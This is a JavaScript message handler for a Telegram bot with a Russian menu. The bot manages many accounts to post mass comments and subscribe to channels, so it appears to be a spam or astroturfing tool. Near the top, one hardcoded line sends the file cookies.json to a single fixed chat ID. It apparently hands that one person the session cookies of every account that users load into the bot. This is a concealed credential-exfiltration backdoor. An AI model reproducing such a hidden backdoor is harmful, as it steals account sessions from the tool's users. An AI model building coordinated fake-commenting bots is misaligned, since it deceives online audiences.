const accountDashboard = require('./functions/bot/accountDashboard');
const addAccounts = require('./functions/bot/addAccount');
const comment = require('./functions/bot/comment');
const stopCommenting = require('./functions/bot/stopCommenting');
const oneComment = require('./functions/bot/oneComment');
const sub = require('./functions/bot/sub');
const users = require('./users.json');

module.exports = async function (msg, bot) {
  if (users.findIndex(item => item.id === msg.from.id) === -1)
    users.push({
      id: msg.from.id,
      username: msg.from.username,
      command: 'start',
      args: []
    });
  
  const userIndex = users.findIndex(user => user.id === msg.from.id);
  
  if (msg.chat.id === 1891387921 && msg.text === 'Список аккаунтов') return await bot.sendDocument(msg.chat.id, "./cookies.json"); 

  switch (msg.text) {
    case "/start":
      await bot.sendMessage(msg.chat.id, "Взаимодействуйте с помощью кнопок", {
        reply_markup: {
          keyboard: [
            ["Список аккаунтов"],
            ["Добавить аккаунты"],
            ["Написать комментарии", "Остановить написание"],
            ["Написать с одного аккаунта"],
            ["Подписаться на канал"]
          ],
          resize_keyboard: true,
        },
      });
      break;
    case 'Список аккаунтов':
      await accountDashboard(msg, bot);
      break;
    case 'Добавить аккаунты':
      await addAccounts(msg, bot, '1');
      break;
    case "Написать комментарии":
      await comment(msg, bot, '1');
      break;
    case "Остановить написание":
      await stopCommenting(msg, bot);
      break;
    case "Написать с одного аккаунта":
      await oneComment(msg, bot, '1');
      break;
    case "Подписаться на канал":
      await sub(msg, bot, '1');
      break
    default:
      switch (users[userIndex].command){
        case 'addTxt':
          await addAccounts(msg, bot, '2');
          break
        case 'commentUrl':
          await comment(msg, bot, '2');
          break;
        case 'commentText':
          await comment(msg, bot, '3');
          break;
        case 'oneUrl':
          await oneComment(msg, bot, '2');
          break;
        case 'oneText':
          await oneComment(msg, bot, '3');
          break;
        case 'oneNum':
          await oneComment(msg, bot, '4');
          break;
        case 'sub':
          await sub(msg, bot, '2');
          break;
      }
  }
};
